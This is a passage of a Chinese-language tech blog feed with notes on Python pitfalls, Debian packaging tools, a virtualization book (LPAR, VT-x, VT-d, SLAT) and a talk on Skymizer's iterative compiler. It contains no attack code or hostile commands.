# 跟 Python 的 list 實作採用 linked list 實作有關  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Python 2  
data = range(10)  
for l in data[:]:  
    data.remove(l)  
print(data)  
=&amp;gt; []  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Package&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;不要 &lt;code&gt;pip freeze &amp;gt; requirements.txt&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;會把 dependency 的 dependency 也寫進去，不知道到底真正要用的是哪些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;2 =&amp;gt; 3&lt;/h3&gt;
&lt;h3&gt;Quality&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;flake8  &lt;ul&gt;
&lt;li&gt;install-hook  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Inheritance&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;正確使用 &lt;code&gt;super()&lt;/code&gt; 可以避免很多問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init Base&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Left&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init Left&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Right&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init Right&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;C&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Left&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Right&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;Left&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="nx"&gt;Right&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init C&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Base&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Left&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Base&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Right&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;Base.__init__()&lt;/code&gt; 有副作用的話就會很恐怖&lt;br /&gt;
正確的寫法要用 &lt;code&gt;super()&lt;/code&gt;  &lt;/p&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html"&gt;Code Like a Pythonista: Idiomatic Python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hynek.me/articles/hasattr/"&gt;hasattr() – A Dangerous Misnomer · Homepage of Hynek Schlawack&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;不要用 &lt;code&gt;hasattr()&lt;/code&gt;，&lt;code&gt;getattr()&lt;/code&gt; 都會被執行，所以如果有副作用的話就會很恐怖。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Physics of IOT - David Mikolas&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.lora-alliance.org/"&gt;Lora&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/micropython/micropython"&gt;GitHub - micropython/micropython: MicroPython - a lean and efficient Python implementation for microcontrollers and constrained systems&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;pynsist&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;py2exe&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pip install pynsist&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PyCon TW 2017 主席開放報名中  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Taipei.py"></category></entry><entry><title>TOSSUG 20160628</title><link href="https://blog.m157q.tw/posts/2016/06/29/tossug-20160628/" rel="alternate"></link><published>2016-06-29T01:23:54+08:00</published><updated>2016-06-29T01:23:54+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-29:posts/2016/06/29/tossug-20160628/</id><summary type="html">&lt;h1&gt;如何打包一個 .deb&lt;/h1&gt;
&lt;h2&gt;Debian Package&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ar - 壓縮  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Ar_(Unix)"&gt;ar (Unix) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debian binary package / Debian source package  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Build tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;fakeroot, debian/rules, binary  &lt;/li&gt;
&lt;li&gt;dpkg-buildpackage  &lt;/li&gt;
&lt;li&gt;debuild / pbuild  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://lintian.debian.org/"&gt;Lintian&lt;/a&gt; check  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;chroot  &lt;/li&gt;
&lt;li&gt;pbuilder / sbuild  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://ubuntuforums.org/showthread.php?t=910717"&gt;http://ubuntuforums.org/showthread.php?t=910717&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.debian.org/HowToPackageForDebian"&gt;https://wiki.debian.org/HowToPackageForDebian&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://unix.stackexchange.com/questions/30303/how-to-create-a-deb-file-manually"&gt;https://unix.stackexchange.com/questions/30303/how-to-create-a-deb-file-manually&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/zzz00072/debian-39338832"&gt;淺談Debian套件打包&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.ubuntu-tw.org/index.php?title=DebPackaging"&gt;DebPackaging - Ubuntu 正體中文 Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ubuntu-tw.org/modules/newbb/viewtopic.php?viewmode=flat&amp;amp;order=DESC&amp;amp;type=&amp;amp;topic_id=97286&amp;amp;forum=14"&gt;[影片教學][TOSSUG] Debian 套件打包工作坊 [論壇 - Ubuntu 文件資源] | Ubuntu 正體中文站&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wen00072.github.io/blog/2014/06/12/package-debian-packages-set-after-list-of-debian-packages/"&gt;[Debian套件打包] 設定好debian目錄後的打包 - My code works, I don’t know why.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://szlin.wordpress.com/2016/06/11/debian-%E5%A5%97%E4%BB%B6%E6%89%93%E5%8C%85%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97-%E7%B9%81%E9%AB%94%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AD%AF/"&gt;Debian 套件打包教學指南 – 繁體中文翻譯 – SZ Lin  &amp;amp; Embedded Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/szlin/debian-62284588"&gt;Debian 套件打包教學指南 - 繁體中文翻譯&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="TOSSUG"></category><category term="Debian"></category></entry><entry><title>《認識虛擬化技術的第一本書》</title><link href="https://blog.m157q.tw/posts/2016/06/23/%E8%AA%8D%E8%AD%98%E8%99%9B%E6%93%AC%E5%8C%96%E6%8A%80%E8%A1%93%E7%9A%84%E7%AC%AC%E4%B8%80%E6%9C%AC%E6%9B%B8/" rel="alternate"></link><published>2016-06-26T14:55:00+08:00</published><updated>2016-06-26T14:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-23:posts/2016/06/23/認識虛擬化技術的第一本書/</id><summary type="html">&lt;p&gt;&lt;img alt="cover" src="/files/認識虛擬化技術的第一本書/cover.jpg" /&gt;  &lt;/p&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;因為大學的時候並沒有修過虛擬化技術相關的課程，&lt;br /&gt;
然後工作上又有用到，&lt;br /&gt;
剛好看到在書架上就拿來翻了。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;沒想到也是一個多月前的事了，現在才寫這篇文章，真的是拖延症患者的日常。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這本書的封面講起來似乎很好懂，&lt;br /&gt;
但看完之後我覺得還是得要有資工相關領域的知識背景才比較看得懂，&lt;br /&gt;
非資訊相關科系的人看這本書可能還是會有點吃力。  &lt;/p&gt;
&lt;p&gt;因為是微軟的日本 Evangelist 寫的書，&lt;br /&gt;
所以都以 Azure 作為範例，&lt;br /&gt;
AWS 跟 GCP 的部份著墨不多，&lt;br /&gt;
但大部份是講些基本觀念，&lt;br /&gt;
所以即便我把跟 Azure 實作範例相關的部份都跳掉，&lt;br /&gt;
還是有學到一些不知道的東西，&lt;br /&gt;
稍微紀錄在底下，&lt;br /&gt;
給自己之後復習用。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;筆記&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Overlay_(programming)"&gt;Overlay&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;當主記憶體必須執行難以負荷的應用程式時，先將該應用程式分割成固定的大小，再依需求逐一載入主記憶體的功能。  &lt;/li&gt;
&lt;li&gt;在硬體還十分昂貴的年代，這是個非常重要的功能。  &lt;/li&gt;
&lt;li&gt;必須先掌握主記憶體與輔助記憶體之間的資料交換才能使用，在虛擬記憶體出現之後，這個功能就愈來愈少被使用了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Logical_partition"&gt;LPAR (Logical Partition)&lt;/a&gt; &amp;amp; &lt;a href="https://en.wikipedia.org/wiki/PR/SM"&gt;PR/SM (Processor Resource/System Manager)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;於 1987 年左右問世  &lt;/li&gt;
&lt;li&gt;LPAR  &lt;ul&gt;
&lt;li&gt;在系統裡建立多個邏輯分區，讓一台電腦看起來擁有兩套系統的技術  &lt;/li&gt;
&lt;li&gt;只要有親自安裝過 Linux、FreeBSD 或是灌過雙系統的人應該都不陌生。  &lt;blockquote&gt;
&lt;p&gt;我是看了這本書才知道可以縮寫成 LPAR ...  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PR/SM  &lt;ul&gt;
&lt;li&gt;能以「將 CPU 的資源劃分給主環境」的概念進行定義，是一種管理系統與資源的技術。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Hyper-V"&gt;Hyper-V&lt;/a&gt; 的歷史  &lt;ul&gt;
&lt;li&gt;原本是美國 Connectix 公司開發的 Macintosh 專用虛擬化軟體 &lt;a href="https://en.wikipedia.org/wiki/Windows_Virtual_PC#Virtual_PC_by_Connectix"&gt;Virtual PC&lt;/a&gt;，是一套為了在 Macintosh 執行 Windows 應用程式而開發的軟體，後來被 Microsoft 併購。  &lt;/li&gt;
&lt;li&gt;在 Windows 7 以前被稱之為 Windows Virtual PC  &lt;/li&gt;
&lt;li&gt;Windows 8 之後又重新以 Hyper-V 的名字出現  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/X86_virtualization#Intel_virtualization_.28VT-x.29"&gt;Intel VT-x&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原本叫作 Vanderpool  &lt;/li&gt;
&lt;li&gt;將 Intel x86 虛擬化的功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/X86_virtualization#I.2FO_MMU_virtualization_.28AMD-Vi_and_Intel_VT-d.29"&gt;Intel VT-d&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;I/O MMU virtualization  &lt;/li&gt;
&lt;li&gt;An input/output memory management unit (IOMMU) allows guest virtual machines to directly use peripheral devices, such as Ethernet, accelerated graphics cards, and hard-drive controllers, through DMA and interrupt remapping. This is sometimes called PCI passthrough.  &lt;/li&gt;
&lt;li&gt;以支援 I/O 處理的虛擬化所開發的功能  &lt;/li&gt;
&lt;li&gt;使用 DMA 記憶體空間的 map/remap 功能的程式，在其他 guest OS 使用到 Hypervisor 裡正被 guest OS 使用的記憶體空間時，就會導致資料毀損。為了避免這種問題發生，guest OS 或 Hypervisor 會管理硬體的哪個位址指定了什麼內容，或是進行排他處理，但這會對效能產生極大的影響。若將這類問題直接交由硬體負責，就可以在不犧牲效能的情況下安全得使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Second_Level_Address_Translation"&gt;SLAT&lt;/a&gt; aka nested paging  &lt;ul&gt;
&lt;li&gt;Second Level Address Translation  &lt;/li&gt;
&lt;li&gt;讓硬體擔起多個 guest OS 與 host OS 之間的位址處理，也就是更安全得提供高效能的虛擬化支援功能。  &lt;/li&gt;
&lt;li&gt;Intel 的 CPU 將這項功能稱為 EPT (Extended Page Table)  &lt;/li&gt;
&lt;li&gt;AMD 的 CPU 將這項功能稱為 NPT (Nested Page Table)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Physical-to-Virtual"&gt;P2V&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Physical to Virtual  &lt;/li&gt;
&lt;li&gt;"Involves the process of decoupling and migrating a physical server's operating system (OS), applications, and data from that physical server to a virtual-machine guest hosted on a virtualized platform."  &lt;/li&gt;
&lt;li&gt;類似用語：V2V (Virtual to Virtual), V2C (Virtual to Cloud), P2C (Physical to Cloud)  &lt;blockquote&gt;
&lt;p&gt;Buzzwords !!!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;書籍連結&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.tenlong.com.tw/items/9863478431?item_id=1010879"&gt;天瓏網路書店 | 認識虛擬化技術的第一本書（超圖解，學習無負擔）&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.books.com.tw/products/0010704880"&gt;博客來-認識虛擬化技術的第一本書（超圖解，學習無負擔）&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="virtualization"></category></entry><entry><title>Cat System Workshop #7 Skymizer intelligent compiler</title><link href="https://blog.m157q.tw/posts/2016/06/21/cat-system-workshop-7-skymizer-intelligent-compiler/" rel="alternate"></link><published>2016-07-05T21:36:00+08:00</published><updated>2016-07-05T21:36:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-21:posts/2016/06/21/cat-system-workshop-7-skymizer-intelligent-compiler/</id><summary type="html">&lt;p&gt;Event link: &lt;a href="http://skymizer.kktix.cc/events/cat0621"&gt;http://skymizer.kktix.cc/events/cat0621&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Q: iPhone 為什麼兩顆 core?&lt;br /&gt;
A: 人類寫出來的程式碼平行度平均約 1.8，所以兩顆就夠了。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;CPU 效能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;2004 年以前，每年改善 50%  &lt;/li&gt;
&lt;li&gt;2004 年之後，每年改善 21%  &lt;/li&gt;
&lt;li&gt;原因  &lt;ul&gt;
&lt;li&gt;電子漂移  &lt;/li&gt;
&lt;li&gt;Power wall - faster computers get really hot  &lt;/li&gt;
&lt;li&gt;Memory wall - memory bandwidth becomes one of the bottlenecks  &lt;/li&gt;
&lt;li&gt;ILP wall - exploit performance from parallelism is diffifult  &lt;ul&gt;
&lt;li&gt;指令集的平行度已經遇到瓶頸  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這 3 個問題都在 2004 年發生，所以突然驟降。  &lt;/li&gt;
&lt;li&gt;什麼時候會掉到 0 %?  &lt;ul&gt;
&lt;li&gt;半年前已經達到了。從半年前開始，CPU 效能已經沒有提升了。  &lt;/li&gt;
&lt;li&gt;大家都不敢講，怕產品銷售受影響。  &lt;/li&gt;
&lt;li&gt;現在只要有改善效能就贏其他人了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;製程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;明年 Q1 達到 10 nm, 7 nm  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;The Best way to speed up Computer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Manual  &lt;/li&gt;
&lt;li&gt;Compiler  &lt;/li&gt;
&lt;li&gt;(...)  &lt;/li&gt;
&lt;li&gt;(...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Improvement&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;中國 H 社去年改善 150%，用飛的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Skymizer Cloud Compiler&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Cloud compiler is a kind of &lt;strong&gt;iterative compiler&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Challenges of Iterative Compilers&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Very long compilation time  &lt;ul&gt;
&lt;li&gt;GCC has ~250 optimization flags  &lt;ul&gt;
&lt;li&gt;~200 machine independent flags  &lt;/li&gt;
&lt;li&gt;~50 machine-level optimization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;There are at least 10^60 combination of flags  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;High cost of scripting  &lt;ul&gt;
&lt;li&gt;A compilation unit needs at least four actions to keep the iteration smooth  &lt;ul&gt;
&lt;li&gt;run.sh, kill.sh, clean.sh, build.sh  &lt;/li&gt;
&lt;li&gt;Users need to tell iterative compiler at least how to run the program  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A system, take WebKit for example, may have ~25,000 compilation units  &lt;/li&gt;
&lt;li&gt;Different systems have very different building systems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Precise performance data  &lt;ul&gt;
&lt;li&gt;An optimization phase has only ~3% impact to performance  &lt;/li&gt;
&lt;li&gt;Application variance of performance are usually about 8%~20%  &lt;/li&gt;
&lt;li&gt;Iterative compilers need precise performance data to ensure analyzed results  &lt;/li&gt;
&lt;li&gt;準確率很重要，如果收集了一大堆資料但準確率很差的話，只是 garbage in garbege out.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unstable optimization results  &lt;ul&gt;
&lt;li&gt;Optimizing compilers don't guarantee performance imporvement  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unstable compilers  &lt;ul&gt;
&lt;li&gt;GCC  &lt;ul&gt;
&lt;li&gt;GCC in average produces on incorrect results in 10,000 iterations  &lt;/li&gt;
&lt;li&gt;GCC in average gets a segmentation fault every 100,000 compilation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LLVM  &lt;ul&gt;
&lt;li&gt;LLVM in average produces one incorrect results in 1000 iterations  &lt;/li&gt;
&lt;li&gt;LLVM in average gets a segmentation fault every 3 compilation  &lt;/li&gt;
&lt;li&gt;所以 LLVM 在 iterative compiler 是不堪用的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重新 compile 也不會過的錯誤，Compiler 本身的 bug，極為難抓。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Iterative compiler before ten years&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Since 1994. Most researches appear since 2001.  &lt;/li&gt;
&lt;li&gt;24 distinguished works. Only seven works have significant contribution.  &lt;/li&gt;
&lt;li&gt;很多論文都只是看到後你知道「喔，這個人畢業了。」的等級  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;2001~2004 Expert System in iterative compilers&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Dr. Options and OSE represent this era.  &lt;/li&gt;
&lt;li&gt;Expert system shortens compilation time.  &lt;/li&gt;
&lt;li&gt;Dr.Options, expert system, TI and HP  &lt;/li&gt;
&lt;li&gt;OSE, pruning by key insights and performance emulators, Princeton.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ACME - we have more exploration space than you can imagine&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Optimization phases can interchange their order.  &lt;/li&gt;
&lt;li&gt;Sequence increases the exploration space from 10^60 to 250^250  &lt;/li&gt;
&lt;li&gt;Although ACME success to eliminate exploraiton space, but we can not use it in practice.  &lt;ul&gt;
&lt;li&gt;GCC re-call phases to simulate order change  &lt;/li&gt;
&lt;li&gt;LLVM can not reorder any phases  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Subtraction is more important then Exploration&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如果一開始就不要嘗試這麼多 optimization，或許可以比較容易找到更有效的方式。  &lt;/li&gt;
&lt;li&gt;PEAK - eliminate space by identifying harmful optimizations  &lt;ul&gt;
&lt;li&gt;先找壞的，把他們刪掉。  &lt;/li&gt;
&lt;li&gt;Batch elimination  &lt;/li&gt;
&lt;li&gt;Iterative elimination  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VISTA - eliminate space by pruning dormant phases  &lt;ul&gt;
&lt;li&gt;先找好的  &lt;/li&gt;
&lt;li&gt;把真正常用的、有效的挑出來，這些彼此之間衝突的做分群，然後再去嘗試  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Social Network can help!&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;cTuning  &lt;/li&gt;
&lt;li&gt;工人智慧  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://ctuning.org/wiki/index.php/CTools:MilepostGCC"&gt;MILEPOST GCC&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/MILEPOST_GCC"&gt;https://en.wikipedia.org/wiki/MILEPOST_GCC&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Collective TUNING  &lt;ul&gt;
&lt;li&gt;每個人都用他的 compiler，他就會偷偷把你的 source code 送回去他的 server，然後再去用 AI 分析該 source code 可不可以做更好的 optimization，藉此收集很多的資料來作為優化的依據。  &lt;blockquote&gt;
&lt;p&gt;xatier: 這不是跟微軟最近在 VS 的 profiler 塞了一個 entrypoint 是一樣的事情嗎？ XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;集眾人之力的群眾 Compile  &lt;/li&gt;
&lt;li&gt;在 4 年前就沒在動了  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Skymizer Intelligent Compiler&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Sky Gold  &lt;ul&gt;
&lt;li&gt;Testing Framework  &lt;/li&gt;
&lt;li&gt;Result Repository  &lt;ul&gt;
&lt;li&gt;Fast build (from hours to seconds)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sky Knight  &lt;ul&gt;
&lt;li&gt;Distributed compilation  &lt;/li&gt;
&lt;li&gt;之後考慮改成用 p2p 的模式，下班電腦開著就可以加入 distributed compilation 的一部份。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sky Dragon  &lt;ul&gt;
&lt;li&gt;Software Hypervisor Precise OS  &lt;/li&gt;
&lt;li&gt;CPU 要跟客戶的一樣才有辦法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sky Wizard  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fast exploration  &lt;ul&gt;
&lt;li&gt;Guide optimization direction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;只要拿到 characteristics，不會拿到客戶的 source code，所以客戶能夠接受。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把使用者 compiler 偷偷換掉  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;把使用者 compile 的過程都紀錄下來  &lt;/li&gt;
&lt;li&gt;找到最好的 object file (&lt;code&gt;*.o&lt;/code&gt;) 之後，check-in 回去給 user，user 只會覺得之後愈用愈快&amp;gt;  &lt;/li&gt;
&lt;li&gt;優點  &lt;ul&gt;
&lt;li&gt;user 實際上 99.9% 的 code 不會動，所以會一直穩定得嘗試 compile 出更快的 object file，再回傳給 user  &lt;/li&gt;
